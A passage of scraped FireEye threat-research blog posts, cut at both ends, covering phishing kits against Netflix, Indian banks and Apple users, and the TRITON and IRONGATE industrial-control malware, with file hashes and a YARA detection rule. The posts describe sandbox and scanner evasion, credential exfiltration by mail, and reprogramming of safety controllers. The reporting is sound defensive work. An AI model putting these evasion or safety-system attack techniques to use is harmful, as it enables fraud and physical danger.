obfuscation using AES encryption Figure 5: PHP code used at server side for encryption Figure 6: JavaScript code used at client-side for decryption Another technique is the host-based evasion, as seen in Figure 7. The host name of organizations such as ‘phishtank’ and ‘google’ are blacklisted. The host name of the client is compared against a list of blacklisted host names. If there is a match against the blacklist, a “404 Not Found” error page is presented. Figure 7: Server side code for blacklisting known hosts. Click image to enlarge. As with the majority of phishing attacks, this campaign uses PHP mail utility to send the attacker the stolen credentials. The advantage of using this technique is that the attacker can host their phishing kits on a number of websites and still get the stolen credentials and other information from a single email account. This enables attackers to extend their reach. Figure 8: Stolen information is sent to an email address using mail() function Tips to Secure your Netflix Account To learn more about securing your Netflix account, Netflix provides additional information on how to keep your account safe from phishing scams and other fraudulent activity at https://www.netflix.com/security. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/11/one-stop-shop-phishing-domain.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2016-11-30",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Labs recently discovered a malicious phishing domain designed to steal a variety of information – including credentials and mobile numbers – from customers of several banks in India. Currently, we have not observed this domain being used in any campaigns. The phishing websites appear to be in the earlier stages of development and through this post we hope users will be able to identify these types of emerging threats in the future. FireEye phishing detection technology identified a newly registered domain, “csecurepay[.]com”, that was registered on Oct. 23, 2016. The website purports to offer online payment gateway services, but is actually a phishing website that leads to the capturing of victim logon credentials – and other information – for multiple banks operating in India. Prior to publication, FireEye notified the Indian Computer Emergency Response Team. Phishing Template Presentation and Techniques Step 1 URL: hxxp://csecurepay[.]com/load-cash-step2.aspx When navigating to the URL, the domain appears to be a payment gateway and requests that the user enter their bank account number and the amount to be transferred, as seen in Figure 1. The victim is allowed to choose their bank from a list that is provided. Figure 1: Bank information being requested By looking at the list, it is clear that only Indian banks are being targeted at this time. A total of 26 banks are available and these are named in the Appendix. Step 2 URL:  hxxp://csecurepay[.]com/PaymentConfirmation.aspx The next website requests the victim to enter their valid 10-digit mobile number and email ID (Figure 2), which makes the website appear more legitimate. Figure 2: Personal information being requested Step 3 The victim will then be redirected to the spoofed online banking page of the bank they selected, which requests that they log in using their user name and password. Figure 3 shows a fake login page for State Bank of India. See the Appendix for more banks that have spoofed login pages. Figure 3: Fake login page for State Bank of India After entering their login credentials, the victim will be asked to key in their One Time Password (OTP), as seen in Figure 4. Figure 4: OTP being requested Step 4 URL: hxxp://csecurepay[.]com/Final.aspx Once all of the sensitive data is gathered, a fake failed login message will be displayed to the victim, as seen in Figure 5. Figure 5: Fake error message being displayed Credit and Debit Card Phishing Website Using the registrant information from the csecurepay domain, we found another domain registered by the phisher as “nsecurepay[.]com”. The domain, registered in latest August 2016, aims to steal credit and debit card information. The following are among the list of cards that are targeted: 1.     ICICI Credit Card 2.     ICICI Debit Card 3.     Visa/Master Credit Card 4.     Visa/Master Debit Card 5.     SBI Debit Card Only At the time of this writing, the nsecurepay website was producing errors when redirecting to spoofed credit and debit card pages. Figure 6 shows the front end. Figure 6: Nsecurepay front end Conclusion Phishing has its own development lifecycle. It usually starts off with building the tools and developing the “hooks” for luring victims into providing their financial information. Once the phishing website (or websites) is fully operational, we typically begin to see a wave of phishing emails pointing to it. In this case, we see that phishing websites have been crafted to spoof multiple banks in India. These attackers can potentially grab sensitive online banking information and other personal data, and even provided support for multifactor authentication and OTP. Moreover, disguising the initial presentation to appear as an online payment gateway service makes the phishing attack seem more legitimate. FireEye Labs detects this phishing attack and customers will be protected against the usage of these sites in possible future campaigns. Appendix Fake login pages were served for 26 banks. The following is a list of some of the banks: -Bank of Baroda - Corporate -Bank of Baroda - Retail -Bank of Maharashtra -HDFC Bank Figure 7: HDFC Bank fake login page -ICICI Bank -IDBI Bank -Indian Bank -IndusInd Bank -Jammu and Kashmir Bank -Kotak Bank -Lakshmi Vilas Bank - Corporate -Lakshmi Vilas Bank - Retail -State Bank of Hyderabad -State Bank of India -State Bank of Jaipur -State Bank of Mysore -State Bank of Patiala -State Bank of Bikaner -State Bank of Travancore -Tamilnad Mercantile Bank -United Bank of India Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/10/rotten_apples_resur.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2016-10-20",
                    "source": "www.fireeye.com"
                },
                "text": "In June 2016, we published a blog about a phishing campaign targeting the Apple IDs and passwords of Chinese Apple users that emerged in the first quarter of 2016 (referred to as the “Zycode” phishing campaign). At FireEye Labs we have an automated system designed to proactively detect newly registered malicious domains and this system had observed some phishing domains that were designed to appear as legitimate Apple domains. Most of the domains reported by this system were suspended in June 2016, which resulted in a loss of momentum for the Zycode phishing campaign. Throughout the second quarter of 2016, the Zycode phishing campaign was in hibernation. We recently observed a resurgence of the same phishing campaign when our systems detected roughly 90 phony Apple-like domains that were registered from July 2016 to September 2016. Once again, Chinese Apple users are being targeted for their Apple IDs and passwords using the same content reported on in our earlier blog. The majority of these domains are registered in the .com TLD by email accounts from qq[.]com, and the IPs of these domains point to mainland China, as seen in Figure 1. Figure 1: Google map showing the location of the hosted phishing domains What has not Changed? The attackers have not changed the content of the phishing sites. The obfuscated JavaScript used in the earlier version is once again being used here in this campaign. We have provided the details of JavaScript and screenshots of interaction with the website in our earlier blog . What has Changed? Apparently the domains and email addresses used in previous version of the campaign were effectively taken down. Now the attackers have moved to a new malicious infrastructure; new domains, IPs and email addresses are being used for this campaign. The new domain names for the campaign are listed in Table 1, while their IPs and registrant emails are reported in Table 2 and Table 3, respectively. Domains List Table 1: Apple phishing domains serving the Zycode phishing kit. Unique IP(s) Table 2 shows the list of unique IPs, which are not the same as what was seen before. Table 2. IP addresses used by the domains. Unique Email Addresses The email addresses used to register these domains, showing no similarity with email addresses in the previous campaign, are shown in Table 3. Table 3. List of unique registrant emails. Unique Registrants Table 4 shows the registrant names, which have no similarity with the previous registrant name information. Table 4. List of registrant names used by the phishing domains. How to Avoid Being a Victim Apple provides information on phishing here and here , and on iCloud security here . There are simple ways for a user to be more secure against this and similar attacks. The following are a few tips: Enable two-factor authentication for Apple ID . Always check the address bar for the correct web address. Avoid clicking links in emails and SMS messages that supposedly direct to iCloud pages. Use our FireEye EX appliance , which provides effective detection for the Zycode phishing campaign. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2017-12-14",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction Mandiant recently responded to an incident at a critical infrastructure organization where an attacker deployed malware designed to manipulate industrial safety systems. The targeted systems provided emergency shutdown capability for industrial processes. We assess with moderate confidence that the attacker was developing the capability to cause physical damage and inadvertently shutdown operations. This malware, which we call TRITON, is an attack framework built to interact with Triconex Safety Instrumented System (SIS) controllers. We have not attributed the incident to a threat actor, though we believe the activity is consistent with a nation state preparing for an attack. TRITON is one of a limited number of publicly identified malicious software families targeted at industrial control systems (ICS) . It follows Stuxnet which was used against Iran in 2010 and Industroyer which we believe was deployed by Sandworm Team against Ukraine in 2016. TRITON is consistent with these attacks, in that it could prevent safety mechanisms from executing their intended function, resulting in a physical consequence. Malware Family Main Modules Description TRITON trilog.exe Main executable leveraging libraries.zip library.zip Custom communication library for interaction with Triconex controllers. Table 1: Description of TRITON Malware Incident Summary The attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message. We assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage for the following reasons: Modifying the SIS could prevent it from functioning correctly, increasing the likelihood of a failure that would result in physical consequences. TRITON was used to modify application memory on SIS controllers in the environment, which could have led to a failed validation check. The failure occurred during the time period when TRITON was used. It is not likely that existing or external conditions, in isolation, caused a fault during the time of the incident. Attribution FireEye has not connected this activity to any actor we currently track; however, we assess with moderate confidence that the actor is sponsored by a nation state. The targeting of critical infrastructure as well as the attacker’s persistence, lack of any clear monetary goal and the technical resources necessary to create the attack framework suggest a well-resourced nation state actor.  Specifically, the following facts support this assessment: The attacker targeted the SIS suggesting an interest in causing a high-impact attack with physical consequences. This is an attack objective not typically seen from cyber-crime groups. The attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available. TRITON is also designed to communicate using the proprietary TriStation protocol which is not publicly documented suggesting the adversary independently reverse engineered this protocol. The targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with numerous attack and reconnaissance activities carried out globally by Russian, Iranian, North Korean, U.S., and Israeli nation state actors. Intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency. Background on Process Control and Safety Instrumented Systems Figure 1: ICS Reference Architecture Modern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as Industrial Control Systems (ICS) or Operational Technology (OT). A Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment. A SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate dangerous situations. Asset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bi-directional communication between DCS and SIS network hosts. Safety Instrumented Systems Threat Model and Attack Scenarios Figure 2: Temporal Relationship Between Cyber Security and Safety The attack lifecycle for disruptive attacks against ICS is similar to other types of cyber attacks, with a few key distinctions. First, the attacker’s mission is to disrupt an operational process rather than steal data. Second, the attacker must have performed OT reconnaissance and have sufficient specialized engineering knowledge to understand the industrial process being controlled and successfully manipulate it. Figure 2 represents the relationship between cyber security and safety controls in a process control environment. Even if cyber security measures fail, safety controls are designed to prevent physical damage. To maximize physical impact, a cyber attacker would also need to bypass safety controls. The SIS threat model below highlights some of the options available to an attacker who has successfully compromised an SIS. Attack Option 1: Use the SIS to shutdown the process The attacker can reprogram the SIS logic to cause it to trip and shutdown a process that is, in actuality, in a safe state. In other words, trigger a false positive. Implication: Financial losses due to process downtime and complex plant start up procedure after the shutdown. Attack Option 2: Reprogram the SIS to allow an unsafe state The attacker can reprogram the SIS logic to allow unsafe conditions to persist. Implication: Increased risk that a hazardous situation will cause physical consequences (e.g. impact to equipment, product, environment and human safety) due to a loss of SIS functionality. Attack Option 3: Reprogram the SIS to allow an unsafe state – while using the DCS to create an unsafe state or hazard The attacker can manipulate the process into an unsafe state from the DCS while preventing the SIS from functioning appropriately. Implication: Impact to human safety, the environment, or damage to equipment, the extent of which depends on the physical constraints of the process and the plant design. Analysis of Attacker Intent We assess with moderate confidence that the attacker’s long-term objective was to develop the capability to cause a physical consequence. We base this on the fact that the attacker initially obtained a reliable foothold on the DCS and could have developed the capability to manipulate the process or shutdown the plant, but instead proceeded to compromise the SIS system. Compromising both the DCS and SIS system would enable the attacker to develop and carry out an attack that causes the maximum amount of damage allowed by the physical and mechanical safeguards in place. Once on the SIS network, the attacker used their pre-built TRITON attack framework to interact with the SIS controllers using the TriStation protocol. The attacker could have caused a process shutdown by issuing a halt command or intentionally uploading flawed code to the SIS controller to cause it to fail. Instead, the attacker made several attempts over a period of time to develop and deliver functioning control logic for the SIS controllers in this target environment. While these attempts appear to have failed due one of the attack scripts’ conditional checks, the attacker persisted with their efforts. This suggests the attacker was intent on causing a specific outcome beyond a process shutdown. Of note, on several occasions, we have observed evidence of long term intrusions into ICS which were not ultimately used to disrupt or disable operations. For instance, Russian operators, such as Sandworm Team, have compromised Western ICS over a multi-year period without causing a disruption. Summary of Malware Capabilities The TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON’s extensive reconnaissance capabilities). The TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks. Recommendations Asset owners who wish to defend against the capabilities demonstrated in the incident, should consider the following controls: Where technically feasible, segregate safety system networks from process control and information system networks. Engineering workstations capable of programming SIS controllers should not be dual-homed to any other DCS process control or information system network. Leverage hardware features that provide for physical control of the ability to program safety controllers. These usually take the form of switches controlled by a physical key. On Triconex controllers, keys should not be left in the PROGRAM mode other than during scheduled programming events. Implement change management procedures for changes to key position. Audit current key state regularly. Use a unidirectional gateway rather than bidirectional network connections for any applications that depend on the data provided by the SIS. Implement strict access control and application whitelisting on any server or workstation endpoints that can reach the SIS system over TCP/IP. Monitor ICS network traffic for unexpected communication flows and other anomalous activity. Figure 3: Triconex Key Switch ( source ) Appendix: Technical Analysis Figure 4: TRITON Architecture and Attack Scenario TRITON was deployed on an SIS engineering workstation running the Microsoft Windows operating system. The malware was named to masquerade as the legitimate Triconex Trilog application. This application is used for reviewing logs and is a part of the TriStation application suite. The malware was delivered as a Py2EXE compiled python script dependent on a zip file containing standard Python libraries, open source libraries, as well as the attacker-developed Triconex attack framework for interacting with the Triconex controllers. Along with the executable, two binary files, inject.bin (malicious function code) and imain.bin (malicious control logic) , were deployed as the controller’s payload. These file names were hard coded in the Py2EXE compiled python script. Trilog.exe took one option from the command line, which was a single IP address of the target Triconex device. It did not leverage the underlying TRITON library’s capability for Triconex device discovery, instead an instance of trilog.exe had to be invoked separately for each target controller in the environment. Once invoked, trilog.exe checked the status of the controller, then read the configuration information exposed by the TriStation protocol. If the controller was in a running state, trilog.exe encoded the two payload files inject.bin and imain.bin and passed them to the communication libraries to be appended to the controller’s program memory and execution table. After payload files were inserted into memory on the Triconex controller, the script initiated a countdown, periodically checking the status of the controller. If an error was detected, the communication library’s method SafeAppendProgramMod attempted to reset the controller to the previous state using a TriStation protocol command. If this failed, trilog.exe attempted to write a small ‘dummy’ program to memory. We assess that this was an anti-forensics technique to hide the presence of the attacker code on the Triconex controller. Working with the asset owner, Mandiant ran trilog.exe in a lab environment with a valid Triconex controller and discovered a conditional check in the malware that prevented the payload binary from persisting in the environment. Mandiant confirmed that, after correcting patching the attack script to remove this check, the payload binary would persist in controller memory, and the controller would continue to run. TRITON implements the TriStation protocol, which is the protocol used by the legitimate TriStation application, to configure controllers. TsHi is the high-level interface created by the malware’s authors that allows the threat actor’s operators to implement attack scripts using the TRITON framework. It exposes functions for both reconnaissance and attack. The functions generally accept binary data from the user, and handle the code ‘signing’ and check sums prior to passing the data to lower level libraries for serialization on to the network. TsBase , another attacker-written module, contains the functions called by TsHi , which translate the attacker’s intended action to the appropriate TriStation protocol function code. For certain functions, it also packs and pads the data in to the appropriate format. TsLow is an additional attacker module that implements the TriStation UDP wire protocol. The TsBase library primarily depends on the ts_exec method. This method takes the function code and expected response code, and serializes the commands payload over UDP. It checks the response from the controller against the expected value and returns a result data structure indicating success or a False object representing failure. TsLow also exposes the connect method used to check connectivity to the target controller. If invoked with no targets, it runs the device discovery function detect_ip. This leverages a \"ping\" message over the TriStation protocol using IP broadcast to find controllers that are reachable via a router from where the script is invoked. Indicators Filename Hash trilog.exe MD5: 6c39c3f4a08d3d78f2eb973a94bd7718 SHA-256: e8542c07b2af63ee7e72ce5d97d91036c5da56e2b091aa2afe737b224305d230 imain.bin MD5: 437f135ba179959a580412e564d3107f SHA-256: 08c34c6ac9186b61d9f29a77ef5e618067e0bc9fe85cab1ad25dc6049c376949 inject.bin MD5: 0544d425c7555dc4e9d76b571f31f500 SHA-256: 5fc4b0076eac7aa7815302b0c3158076e3569086c4c6aa2f71cd258238440d14 library.zip MD5: 0face841f7b2953e7c29c064d6886523 SHA-256: bef59b9a3e00a14956e0cd4a1f3e7524448cbe5d3cc1295d95a15b83a3579c59 TS_cnames.pyc MD5: e98f4f3505f05bf90e17554fbc97bba9 SHA-256: 2c1d3d0a9c6f76726994b88589219cb8d9c39dd9924bc8d2d02bf41d955fe326 TsBase.pyc MD5: 288166952f934146be172f6353e9a1f5 SHA-256: 1a2ab4df156ccd685f795baee7df49f8e701f271d3e5676b507112e30ce03c42 TsHi.pyc MD5: 27c69aa39024d21ea109cc9c9d944a04 SHA-256: 758598370c3b84c6fbb452e3d7119f700f970ed566171e879d3cb41102154272 TsLow.pyc MD5: f6b3a73c8c87506acda430671360ce15 SHA-256: 5c776a33568f4c16fee7140c249c0d2b1e0798a96c7a01bfd2d5684e58c9bb32 sh.pyc MD5: 8b675db417cc8b23f4c43f3de5c83438 SHA-256: c96ed56bf7ee85a4398cc43a98b4db86d3da311c619f17c8540ae424ca6546e1 Detection rule TRITON_ICS_FRAMEWORK { meta: author = \"nicholas.carr @itsreallynick\" md5 = \"0face841f7b2953e7c29c064d6886523\" description = \"TRITON framework recovered during Mandiant ICS incident response\" strings: $python_compiled = \".pyc\" nocase ascii wide $python_module_01 = \"__module__\" nocase ascii wide $python_module_02 = \"<module>\" nocase ascii wide $python_script_01 = \"import Ts\" nocase ascii wide $python_script_02 = \"def ts_\" nocase ascii wide $py_cnames_01 = \"TS_cnames.py\" nocase ascii wide $py_cnames_02 = \"TRICON\" nocase ascii wide $py_cnames_03 = \"TriStation \" nocase ascii wide $py_cnames_04 = \" chassis \" nocase ascii wide $py_tslibs_01 = \"GetCpStatus\" nocase ascii wide $py_tslibs_02 = \"ts_\" ascii wide $py_tslibs_03 = \" sequence\" nocase ascii wide $py_tslibs_04 = /import Ts(Hi|Low|Base)[^:alpha:]/ nocase ascii wide $py_tslibs_05 = /module\\s?version/ nocase ascii wide $py_tslibs_06 = \"bad \" nocase ascii wide $py_tslibs_07 = \"prog_cnt\" nocase ascii wide $py_tsbase_01 = \"TsBase.py\" nocase ascii wide $py_tsbase_02 = \".TsBase(\" nocase ascii wide $py_tshi_01 = \"TsHi.py\" nocase ascii wide $py_tshi_02 = \"keystate\" nocase ascii wide $py_tshi_03 = \"GetProjectInfo\" nocase ascii wide $py_tshi_04 = \"GetProgramTable\" nocase ascii wide $py_tshi_05 = \"SafeAppendProgramMod\" nocase ascii wide $py_tshi_06 = \".TsHi(\" ascii nocase wide $py_tslow_01 = \"TsLow.py\" nocase ascii wide $py_tslow_02 = \"print_last_error\" ascii nocase wide $py_tslow_03 = \".TsLow(\" ascii nocase wide $py_tslow_04 = \"tcm_\" ascii wide $py_tslow_05 = \" TCM found\" nocase ascii wide $py_crc_01 = \"crc.pyc\" nocase ascii wide $py_crc_02 = \"CRC16_MODBUS\" ascii wide $py_crc_03 = \"Kotov Alaxander\" nocase ascii wide $py_crc_04 = \"CRC_CCITT_XMODEM\" ascii wide $py_crc_05 = \"crc16ret\" ascii wide $py_crc_06 = \"CRC16_CCITT_x1D0F\" ascii wide $py_crc_07 = /CRC16_CCITT[^_]/ ascii wide $py_sh_01 = \"sh.pyc\" nocase ascii wide $py_keyword_01 = \" FAILURE\" ascii wide $py_keyword_02 = \"symbol table\" nocase ascii wide $py_TRIDENT_01 = \"inject.bin\" ascii nocase wide $py_TRIDENT_02 = \"imain.bin\" ascii nocase wide condition: 2 of ($python_*) and 7 of ($py_*) and filesize < 3MB } Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/04/six-subversive-concerns-for-ics-environments.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2017-04-12",
                    "source": "www.fireeye.com"
                },
                "text": "Industrial enterprises such as electric utilities, petroleum companies, and manufacturing organizations invest heavily in industrial control systems (ICS) to efficiently, reliably, and safely operate industrial processes. Without this technology operating the plant floor, these businesses cannot exist. Board members, executives, and security officers are often unaware that the technology operating the economic engine of their enterprise invites undetected subversion. In this paper, FireEye iSIGHT Intelligence prepares risk executives and security practitioners to knowledgeably discuss six core weaknesses an adversary can use to undermine a plant's operation: Unauthenticated protocols Outdated hardware Weak user authentication Weak file integrity checks Vulnerable Windows operating systems Undocumented third-party relationships Download the report to learn more. To discuss these six subversive vulnerabilities threatening today’s industrial environments, register for our live webinar scheduled for Tuesday, April 25 at 11:00am ET/8:00am PT. Explore the implications and how to address them firsthand with our ICS intelligence experts. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/08/overload-critical-lessons-from-15-years-of-ics-vulnerabilities.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2016-08-03",
                    "source": "www.fireeye.com"
                },
                "text": "In the past several years, a flood of vulnerabilities has hit industrial control systems (ICS) – the technological backbone of electric grids, water supplies, and production lines. These vulnerabilities affect the reliable operation of sensors, programmable controllers, software and networking equipment used to automate and monitor the physical processes that keep our modern world running. FireEye iSIGHT Intelligence has identified nearly 1,600 publicly disclosed ICS vulnerabilities since 2000. We go more in depth on these issues in our latest report, Overload: Critical Lessons from 15 Years of ICS Vulnerabilities , which highlights trends in total ICS vulnerability disclosures, patch availability, vulnerable device type and vulnerabilities exploited in the wild. FireEye’s acquisition of iSIGHT provided tremendous visibility into the depth and breadth of vulnerabilities in the ICS landscape and how threat actors try to exploit them. To make matters worse, many of these vulnerabilities are left unpatched and some are simply unpatchable due to outdated technology, thus increasing the attack surface for potential adversaries. In fact, nation-state cyber threat actors have exploited five of these vulnerabilities in attacks since 2009. Unfortunately, security personnel from manufacturing, energy, water and other industries are often unaware of their own control system assets, not to mention the vulnerabilities that affect them. As a result, organizations operating these systems are missing the warnings and leaving their industrial environments exposed to potential threats. Click here to download the report and learn more. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2016-06-02",
                    "source": "www.fireeye.com"
                },
                "text": "In the latter half of 2015, the FireEye Labs Advanced Reverse Engineering (FLARE) team identified several versions of an ICS-focused malware crafted to manipulate a specific industrial process running within a simulated Siemens control system environment. We named this family of malware IRONGATE. FLARE found the samples on VirusTotal while researching droppers compiled with PyInstaller — an approach used by numerous malicious actors. The IRONGATE samples stood out based on their references to SCADA and associated functionality. Two samples of the malware payload were uploaded by different sources in 2014, but none of the antivirus vendors featured on VirusTotal flagged them as malicious. Siemens Product Computer Emergency Readiness Team (ProductCERT) confirmed that IRONGATE is not viable against operational Siemens control systems and determined that IRONGATE does not exploit any vulnerabilities in Siemens products. We are unable to associate IRONGATE with any campaigns or threat actors. We acknowledge that IRONGATE could be a test case, proof of concept, or research activity for ICS attack techniques. Our analysis finds that IRONGATE invokes ICS attack concepts first seen in Stuxnet , but in a simulation environment. Because the body of industrial control systems (ICS) and supervisory control and data acquisition (SCADA) malware is limited, we are sharing details with the broader community. Malicious Concepts Deceptive Man-in-the-Middle IRONGATE's key feature is a man-in-the-middle (MitM) attack against process input-output (IO) and process operator software within industrial process simulation. The malware replaces a Dynamic Link Library (DLL) with a malicious DLL, which then acts as a broker between a PLC and the legitimate monitoring software. This malicious DLL records five seconds of 'normal' traffic from a PLC to the user interface and replays it, while sending different data back to the PLC. This could allow an attacker to alter a controlled process unbeknownst to process operators. Sandbox Evasion IRONGATE's second notable feature involves sandbox evasion. Some droppers for the IRONGATE malware would not run if VMware or Cuckoo Sandbox environments were employed. The malware uses these techniques to avoid detection and resist analysis, and developing these anti-sandbox techniques indicates that the author wanted the code to resist casual analysis attempts. It also implies that IRONGATE’s purpose was malicious, as opposed to a tool written for other legitimate purposes. Dropper Observables We first identified IRONGATE when investigating droppers compiled with PyInstaller — an approach used by numerous malicious actors. In addition, strings found in the dropper include the word “payload”, which is commonly associated with malware. Unique Features for ICS Malware While IRONGATE malware does not compare to Stuxnet in terms of complexity, ability to propagate, or geopolitical implications, IRONGATE leverages some of the same features and techniques Stuxtnet used to attack centrifuge rotor speeds at the Natanz uranium enrichment facility; it also demonstrates new features for ICS malware. Both pieces of malware look for a single, highly specific process. Both replace DLLs to achieve process manipulation. IRONGATE detects malware detonation/observation environments, whereas Stuxnet looked for the presence of antivirus software. IRONGATE actively records and plays back process data to hide manipulations, whereas Stuxnet did not attempt to hide its process manipulation, but suspended normal operation of the S7-315 so even if rotor speed had been displayed on the HMI, the data would have been static . A Proof of Concept IRONGATE’s characteristics lead us to conclude that it is a test, proof of concept, or research activity. The code is specifically crafted to look for a user-created DLL communicating with the Siemens PLCSIM environment. PLCSIM is used to test PLC program functionality prior to in-field deployment. The DLLs that IRONGATE seeks and replaces are not part of the Siemens standard product set, but communicate with the S7ProSim COM object. Malware authors test concepts using commercial simulation software. Code in the malicious software closely matched usage on a control engineering blog dealing with PLCSIM (https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/ and https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/). While we have identified and analyzed several droppers for the IRONGATE malware, we have yet to identify the code’s infection vector. In addition, our analysis did not identify what triggers the MitM payload to install; the scada.exe binary that deploys the IRONGATE DLL payload appears to require manual execution. We have not identified any other instances of the ICS-specific IRONGATE components ( scada.exe and Step7ProSim.dll ), despite their having been compiled in September of 2014. Siemens ProductCERT has confirmed that the code would not work against a standard Siemens control system environment. Implications for ICS Asset Owners Even though process operators face no increased risk from the currently identified members of the IRONGATE malware family, IRONGATE provides valuable insight into adversary mindset. Network security monitoring, indicator of compromise (IoC) matching, and good practice guidance from vendors and other stakeholders represent important defensive techniques for ICS networks. To specifically counter IRONGATE’s process attack techniques, ICS asset owners may, over the longer term, implement solutions that: Require integrity checks and code signing for vendor and user generated code. Lacking cryptographic verification facilitates file replacement and MitM attacks against controlled industrial processes. Develop mechanisms for sanity checking IO data, such as independent sensing and backhaul, and comparison with expected process state information. Ignorance of expected process state facilitates an attacker’s ability to achieve physical consequence without alarming operators. Technical Malware Analysis IRONGATE Dropper Family FireEye has identified six IRONGATE droppers: bla.exe, update.exe 1 , update_no_pipe.exe 1, update_no_pipe.exe 2 , update_no_pipe.exe 2 , update.exe 3 . All but one of these Python-based droppers first checks for execution in a VMware or Cuckoo Sandbox environment. If found, the malware exits. If not found, the IRONGATE dropper extracts a UPX-packed, publicly available utility ( NirSoft NetResView version 1.27 ) to audiodg.exe in the same directory as the dropper. The dropper then executes the utility using the command audiodg.exe /scomma scxrt2.ini. This command populates the file scxrt2.ini with a comma-separated list of network resources identified by the host system. The dropper iterates through each entry in scxrt2.ini , looking for paths named move-to-operational or move-to-operational.lnk . If a path is found, the dropper first extracts the Base64-encoded .NET executable scada.exe to the current directory and then moves the file to the path containing move-to-operational or move-to-operational.lnk. The path move-to-operational is interesting as well, perhaps implying that IRONGATE was not seeking the actual running process, but rather a staging area for code promotion. The dropper does not execute the scada.exe payload after moving it. Anti-Analysis Techniques Each IRONGATE dropper currently identified deploys the same .NET payload, scada.exe. All but one of the droppers incorporated anti-detection/analysis techniques to identify execution in VMware or the Cuckoo Sandbox. If such environments are detected, the dropper will not deploy the .NET executable ( scada.exe ) to the host. Four of the droppers ( update.exe 1 , update_no_pipe.exe 1 , update_no_pipe.exe 2 , and update.exe 3 ) detect Cuckoo environments by scanning subdirectories of the %SystemDrive% . Directories with names greater than five, but fewer than ten characters are inspected for the subdirectories drop, files, logs, memory, and shots. If a matching directory is found, the dropper does not attempt to deploy the scada.exe payload. The update.exe 1 and update.exe 3 droppers contain code for an additional Cuckoo check using the SysInternals pipelist program, install.exe , but the code is disabled in each. The update.exe 2 dropper includes a check for VMware instead of Cuckoo. The VMWare check looks for the registry key HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools and the files %WINDIR% \\system32\\drivers\\vmmouse.sys and %WINDIR% \\system32\\drivers\\vmhgfs.sys . If any of these are found, the dropper does not attempt to deploy the scada.exe payload. The dropper bla.exe does not include an environment check for either Cuckoo or VMware. scada.exe Payload We surmise that scada.exe is a user-created payload used for testing the malware. First, our analysis did not indicate what triggers scada.exe to run. Second, Siemens ProductCERT informed us that scada.exe is not a default file name associated with Siemens industrial control software. When scada.exe executes, it scans drives attached to the system for filenames ending in Step7ProSim.dll . According to the Siemens ProductCERT, Step7ProSim.dll is not part of the Siemens PLCSIM software. We were unable to determine whether this DLL was created specifically by the malware author, or if it was from another source, such as example code or a particular custom ICS implementation. We surmise this DLL simulates generation of IO values, which would normally be provided by an S7-based controller, since the functions it includes appear derived from the Siemens PLCSIM environment. If scada.exe finds a matching DLL file name, it kills all running processes with the name biogas.exe . The malware then moves Step7ProSim.dll to Step7ConMgr.dll and drops a malicious Step7ProSim.dll – the IRONGATE payload – to the same directory. The malicious Step7ProSim.dll acts as an API proxy between the original user-created Step7ProSim.dll (now named Step7ConMgr.dll ) and the application biogas.exe that loads it. Five seconds after loading, the malicious Step7ProSim.dll records five seconds of calls to ReadDataBlockValue . All future calls to ReadDataBlockValue return the recorded data. Simultaneously, the malicious DLL discards all calls to WriteDataBlockValue and instead calls WriteInputPoint(0x110, 0, 0x7763) and 